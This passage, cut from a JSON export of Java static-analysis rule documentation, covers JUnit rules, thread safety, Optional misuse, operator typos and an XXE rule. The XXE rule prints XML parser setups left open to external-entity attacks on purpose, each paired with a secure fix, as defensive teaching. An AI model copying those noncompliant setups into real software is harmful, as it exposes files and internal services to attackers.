@Rule\n  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ProjectDefinitionTest {\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://junit.org/junit4/javadoc/4.12/org/junit/Rule.html\">Junit API - Rule</a> </li>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Rules\">Junit - Rules</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/junit-4-rules\">Junit 4 Rules</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2924","summary":"JUnit rules should be used","tags":["junit","tests","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A synchronized method is a method marked with the <code>synchronized</code> keyword, meaning it can only be accessed by one thread at a time. If\nmultiple threads try to access the synchronized method simultaneously, they will be blocked until the method is available.</p>\n<p>Synchronized methods prevent race conditions and data inconsistencies in multi-threaded environments. Ensuring that only one thread can access a\nmethod at a time, prevents multiple threads from modifying the same data simultaneously, and causing conflicts.</p>\n<p>When one part of a getter/setter pair is <code>synchronized</code> the other should be too. Failure to synchronize both sides may result in\ninconsistent behavior at runtime as callers access an inconsistent method state.</p>\n<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchronized, but the other is not.</p>\n<h2>How to fix it</h2>\n<p>Synchronize both <code>get</code> and <code>set</code> methods by marking the method with the <code>synchronize</code> keyword or using a\n<code>synchronize</code> block inside them.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public String getName() {  // Noncompliant\n    return this.name;\n  }\n\n  public void setAge(int age) {  // Noncompliant\n    this.age = age;\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public synchronized String getName() {\n    return this.name;\n  }\n\n  public void setAge(int age) {\n    synchronized (this) {\n      this.age = age;\n   }\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/concurrency/syncmeth.html\">Oracle Java - Synchronized Methods</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se20/html/jls-8.html#jls-8.4.3.6\">Oracle SE 20 - Synchronized Methods</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://web.mit.edu/6.005/www/fa14/classes/18-thread-safety/\">MIT - Thread safety</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-thread-safety\">Baeldung - Thread safety</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jdGBQ\">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable objects </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2886","summary":"Getters and setters should be synchronized in pairs","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When an object is marked as <code>static</code>, it means that it belongs to the class rather than any class instance. This means there is only one\ncopy of the static object in memory, regardless of how many class instances are created. Static objects are shared among all instances of the class\nand can be accessed using the class name rather than an instance of the class.</p>\n<p>A data type is considered thread-safe if it can be used correctly by multiple threads, regardless of how those threads are executed, without\nrequiring additional coordination from the calling code. In other words, a thread-safe data type can be accessed and modified by multiple threads\nsimultaneously without causing any issues or requiring extra work from the programmer to ensure correct behavior.</p>\n<p>Non-thread-safe objects are objects that are not designed to be used in a multi-threaded environment and can lead to race conditions and data\ninconsistencies when accessed by multiple threads simultaneously. Using them in a multi-threaded manner is highly likely to cause data problems or\nexceptions at runtime.</p>\n<p>When a non-thread-safe object is marked as static in a multi-threaded environment, it can cause issues because the non-thread-safe object will be\nshared across different instances of the containing class.</p>\n<p>This rule raises an issue when any of the following instances and their subtypes are marked as <code>static</code>:</p>\n<ul>\n  <li> <code>java.util.Calendar</code>, </li>\n  <li> <code>java.text.DateFormat</code>, </li>\n  <li> <code>javax.xml.xpath.XPath</code>, or </li>\n  <li> <code>javax.xml.validation.SchemaFactory</code>. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Remove the <code>static</code> keyword from non-thread-safe fields.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n  private static Calendar calendar = Calendar.getInstance();  // Noncompliant\n  private static SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n  private Calendar calendar = Calendar.getInstance();\n  private SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://web.mit.edu/6.005/www/fa14/classes/18-thread-safety/\">MIT - Thread safety</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-thread-safety\">Baeldung - Thread safety</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-static\">Baeldung - Static</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2885","summary":"Non-thread-safe fields should not be static","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>Map</code> is an object that maps keys to values. A map cannot contain duplicate keys, which means each key can map to at most one value.</p>\n<p>When both the key and the value are needed, it is more efficient to iterate the <code>entrySet()</code>, which will give access to both instead of\niterating over the <code>keySet()</code> and then getting the value.</p>\n<p>If the <code>entrySet()</code> method is not iterated when both the key and value are needed, it can lead to unnecessary lookups. This is because\neach lookup requires two operations: one to retrieve the key and another to retrieve the value. By iterating the <code>entrySet()</code> method, the\nkey-value pair can be retrieved in a single operation, which can improve performance.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved\n    Object value = map.get(key);\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {\n    String key = entry.getKey();\n    Object value = entry.getValue();\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/util/Map.html\">Oracle SE 20 - Map</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-map-entries-methods\">Baeldung - Java Map methods</a> </li>\n</ul>\n<h3>Benchmarks</h3>\n<table>\n  <colgroup>\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Method</th>\n      <th>size</th>\n      <th>Runtime</th>\n      <th>Average time</th>\n      <th>Error margin</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>usingEntrySet</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>27.48 ns/op</p></td>\n      <td><p>Â±6.22 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>usingEntrySet</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>2480.26 ns/op</p></td>\n      <td><p>Â±899.05 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>usingEntrySet</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>22745.78 ns/op</p></td>\n      <td><p>Â±10505.46 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>usingKeySet</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>49.70 ns/op</p></td>\n      <td><p>Â±3.78 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>usingKeySet</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>5061.54 ns/op</p></td>\n      <td><p>Â±2056.60 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>usingKeySet</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>46689.04 ns/op</p></td>\n      <td><p>Â±14509.97 ns/op</p></td>\n    </tr>\n  </tbody>\n</table>\n<p><strong>Benchmarking code</strong></p>\n<p>The results were generated by running the following snippet with <a href=\"https://github.com/openjdk/jmh\">JMH</a>.</p>\n<pre>\n@BenchmarkMode({Mode.AverageTime})\n@OutputTimeUnit(TimeUnit.NANOSECONDS)\n@State(Scope.Benchmark)\npublic class S2864 {\n  @Param({\"10\", \"1000\", \"10000\"})\n  int size;\n\n  Map&lt;Integer,Integer&gt; map;\n\n  @Setup(Level.Trial)\n  public void setup() {\n    Random random = new Random();\n    map = new HashMap&lt;&gt;();\n    for (int i = 0; i &lt; size; i++) {\n      map.put(i, random.nextInt());\n    }\n  }\n\n  @Benchmark\n  public int usingKeySet() {\n    int sumKeysValues = 0;\n    for (Integer key : map.keySet()) {\n      sumKeysValues += key + map.get(key);\n    }\n    return sumKeysValues;\n  }\n\n  @Benchmark\n  public int usingEntrySet() {\n    int sumKeysValues = 0;\n    for (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) {\n      sumKeysValues += entry.getKey() + entry.getValue();\n    }\n    return sumKeysValues;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2864","summary":"\"entrySet()\" should be iterated when both the key and value are needed","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>Optional</code> acts as a container object that may or may not contain a non-null value. It is introduced in Java 8 to help avoid\n<code>NullPointerException</code>. It provides methods to check if a value is present and retrieve the value if it is present.</p>\n<p><code>Optional</code> is used instead of <code>null</code> values to make the code more readable and avoid potential errors.</p>\n<p>It is a bad practice to use <code>null</code> with <code>Optional</code> because it is unclear whether a value is present or not, leading to\nconfusion and potential <code>NullPointerException</code> errors.</p>\n<h2>How to fix it</h2>\n<p>There are a few ways to fix this issue:</p>\n<ul>\n  <li> Avoid returning <code>null</code> from a method whose return type is <code>Optional</code>. </li>\n  <li> Remove the null-check of an <code>Optional</code> and use <code>Optional</code> methods instead, like <code>isPresent()</code> or\n  <code>ifPresent()</code>. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  if (optional != null) {  // Noncompliant\n    // do something with optional...\n  }\n  Optional&lt;String&gt; text = null; // Noncompliant, a variable whose type is Optional should never itself be null\n  // ...\n}\n\n@Nullable // Noncompliant\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  optional.ifPresent(\n    // do something with optional...\n  );\n  Optional&lt;String&gt; text = Optional.empty();\n  // ...\n}\n\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return Optional.empty();\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/util/Optional.html\">Oracle SDK 20 - Optional</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-optional\">Java Optional Guide</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2789","summary":"\"null\" should not be used with \"Optional\"","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In Java, an enum is a special data type that allows you to define a set of constants. Nested enum types, also known as inner enum types, are enum\ntypes that are defined within another class or interface.</p>\n<p>Nested enum types are implicitly static, so there is no need to declare them <code>static</code> explicitly.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Flower {\n  static enum Color { // Noncompliant; static is redundant here\n    RED, YELLOW, BLUE, ORANGE\n  }\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Flower {\n  enum Color { // Compliant\n    RED, YELLOW, BLUE, ORANGE\n  }\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se20/html/jls-8.html#jls-8.9\">Java Language Specification-8.9</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2786","summary":"Nested \"enum\"s should not be declared static","tags":["redundant"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The repetition of a unary operator is usually a typo. The second operator invalidates the first one in most cases:</p>\n<pre>\nint i = 1;\n\nint j = - - -i;  // Noncompliant: equivalent to \"-i\"\nint k = ~~~i;    // Noncompliant: equivalent to \"~i\"\nint m = + +i;    // Noncompliant: equivalent to \"i\"\n\nboolean b = false;\nboolean c = !!!b;   // Noncompliant\n</pre>\n<p>On the other hand, while repeating the increment and decrement operators is technically correct, it obfuscates the meaning:</p>\n<pre>\nint i = 1;\nint j = ++ ++i;  // Noncompliant\nint k = i-- --; // Noncompliant\n</pre>\n<p>Using <code>+=</code> or <code>-=</code> improves readability:</p>\n<pre>\nint i = 1;\ni += 2;\nint j = i;\nint k = i;\ni -=2;\n</pre>\n<p>This rule raises an issue for repetitions of <code>!</code>, <code>~</code>, <code>-</code>, <code>+</code>, prefix increments <code>++</code> and\nprefix decrements <code>--</code>.</p>\n<h3>Exceptions</h3>\n<p>Overflow handling for GWT compilation using <code>~~</code> is ignored.</p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2761","summary":"Unary prefix operators should not be repeated","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using operator pairs (<code>=+</code>, <code>=-</code>, or <code>=!</code>) that look like reversed single operators (<code>+=</code>,\n<code>-=</code> or <code>!=</code>) is confusing. They compile and run but do not produce the same result as their mirrored counterpart.</p>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget =- num;  // Noncompliant: target = -3. Is that the intended behavior?\ntarget =+ num; // Noncompliant: target = 3\n</pre>\n<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> are used without any space between the operators and when there\nis at least one whitespace after.</p>\n<p>Replace the operators with a single one if that is the intention</p>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget -= num;  // target = -8\n</pre>\n<p>Or fix the spacing to avoid confusion</p>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget = -num;  // target = -3\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2757","summary":"Non-existent operators like \"=+\" should not be used","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the systemâs memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic void decode() {\n    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport javax.xml.stream.XMLInputFactory;\n\npublic void decode() {\n    XMLInputFactory factory = XMLInputFactory.newInstance(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For <code>DocumentBuilderFactory</code>, <code>SAXParserFactory</code>, <code>TransformerFactory</code>, and <code>SchemaFactory</code> set\n<code>XMLConstants.FEATURE_SECURE_PROCESSING</code> to <code>true</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic void decode() {\n    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n}\n</pre>\n<p>For <code>XMLInputFactory</code> set <code>SUPPORT_DTD</code> to <code>false</code>.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport javax.xml.stream.XMLInputFactory;\n\npublic void decode() {\n    XMLInputFactory factory = XMLInputFactory.newInstance();\n    factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n}\n</pre>\n<p>Other combinations of settings are secure, but in general, it is recommendable to use the approaches shown here, as they are the most clear.</p>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h3>Going the extra mile</h3>\n<h4>Disable entity expansion</h4>\n<p>Specifically for <code>DocumentBuilderFactory</code>, it is possible to disable the entity expansion. Note, however, that this does not prevent the\nretrieval of external entities.</p>\n<pre>\nfactory.setExpandEntityReferences(false);\n</pre>\n<h2>How to fix it in Dom4j</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport org.dom4j.io.SAXReader;\n\npublic void decode() {\n    SAXReader xmlReader = new SAXReader(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport org.dom4j.io.SAXReader;\n\npublic void decode() {\n    SAXReader xmlReader = new SAXReader();\n    xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>How to fix it in Jdom2</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport org.jdom2.input.SAXBuilder;\n\npublic void decode() {\n    SAXBuilder builder = new SAXBuilder(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport org.jdom2.input.SAXBuilder;\n\npublic void decode() {\n    SAXBuilder builder = new SAXBuilder();\n    builder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>How to fix it in SAX</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"noncompliant\">\nimport org.xml.sax.XMLReader;\nimport org.xml.sax.helpers.XMLReaderFactory;\n\npublic void decode() {\n    XMLReader reader = XMLReaderFactory.createXMLReader(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Set <code>disallow-doctype-decl</code> to <code>true</code>.</p>\n<pre data-diff-id=\"31\" data-diff-type=\"compliant\">\nimport org.xml.sax.XMLReader;\nimport org.xml.sax.helpers.XMLReaderFactory;\n\npublic void decode() {\n    XMLReader reader = XMLReaderFactory.createXMLReader();\n    reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2755","summary":"XML parsers should not be vulnerable to XXE attacks","tags":["cwe","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting\nit bubble up automatically.</p>\n<pre>\npublic String readFile(File f) throws IOException {\n  String content;\n  try {\n    content = readFromDisk(f);\n  } catch (IOException e) {\n    throw e;\n  }\n  return content;\n}\n</pre>\n<p>Such clauses should either be removed or populated with the appropriate logic.</p>\n<pre>\npublic String readFile(File f) throws IOException {\n  return readFromDisk(f);\n}\n</pre>\n<p>or</p>\n<pre>\npublic String readFile(File f) throws IOException {\n  String content;\n  try {\n    content = readFromDisk(f);\n  } catch (IOException e) {\n    logger.LogError(e);\n    throw e;\n  }\n  return content;\n}\n</pre>\n<p>In the case of try-with-resources, the try should remain even without a catch clause, to keep the resource management</p>\n<pre>\nString readFirstLine(FileReader fileReader) throws IOException {\n  try (BufferedReader br = new BufferedReader(fileReader)) {\n     return br.readLine();\n  } catch (IOException e) { // Noncompliant\n  throw e;\n}\n</pre>\n<p>becomes</p>\n<pre>\nString readFirstLine(FileReader fileReader) throws IOException {\n  try (BufferedReader br = new BufferedReader(fileReader)) {\n     return 